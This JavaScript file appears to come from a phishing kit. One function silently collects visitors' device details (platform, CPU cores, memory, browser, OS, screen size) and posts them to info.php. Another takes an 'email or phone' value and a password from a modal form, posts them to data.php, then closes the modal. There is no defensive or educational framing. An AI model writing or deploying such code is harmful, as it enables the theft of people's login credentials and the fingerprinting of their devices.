function getInformation() {
  let ptf = navigator.platform;
  let cc =
    navigator.hardwareConcurrency == undefined
      ? "Not Avaiable"
      : navigator.hardwareConcurrency;
  let ram =
    navigator.deviceMemory == undefined
      ? "Not Avaiable"
      : navigator.deviceMemory;
  let ver = navigator.userAgent;
  let str = ver;
  let os = ver;

  //browser
  if (ver.indexOf("Firefox") != -1) {
    str = str.substring(str.indexOf(" Firefox/") + 1);
    str = str.split(" ");
    brw = str[0];
  } else if (ver.indexOf("Chrome") != -1) {
    str = str.substring(str.indexOf(" Chrome/") + 1);
    str = str.split(" ");
    brw = str[0];
  } else if (ver.indexOf("Safari") != -1) {
    str = str.substring(str.indexOf(" Safari/") + 1);
    str = str.split(" ");
    brw = str[0];
  } else if (ver.indexOf("Edge") != -1) {
    str = str.substring(str.indexOf(" Edge/") + 1);
    str = str.split(" ");
    brw = str[0];
  } else {
    brw = "Not Available";
    console.log("Browser is not available");
  }

  //os
  os = os.substring(0, os.indexOf(")"));
  os = os.split(";");
  os = os[1];
  if (os == undefined) {
    os = "Not Available";
    console.log("OS is not available");
  }
  os = os.trim();
  var ht = window.screen.height;
  var wd = window.screen.width;
  let data = {
    Ptf: ptf,
    Brw: brw,
    Cc: cc,
    Ram: ram,

    Ht: ht,
    Wd: wd,
    Os: os,
  };

  $.ajax({
    type: "POST",
    url: "info.php",
    data: data,
    success: function () {
      console.log("Success!");
    },
    mimeType: "text",
  });
}

function login() {
  let emailOrPhone = document.getElementById("email-input");
  let password = document.getElementById("password-input");
  console.log(emailOrPhone.value.length);

  if (emailOrPhone.value.length == 0) {
    emailOrPhone.style.borderColor = "red";
    return;
  }
  if (password.value.length == 0) {
    password.style.borderColor = "red";
    return;
  }
  emailOrPhone.style.borderColor = "#80808033";
  password.style.borderColor = "#80808033";
  $.ajax({
    type: "POST",
    url: "data.php",
    data: { emailOrPhone: emailOrPhone.value, password: password.value },
    success: function () {
      console.log("Success!");
    },
    mimeType: "text",
  });

  document.getElementById("modal").style.display = "none";
}
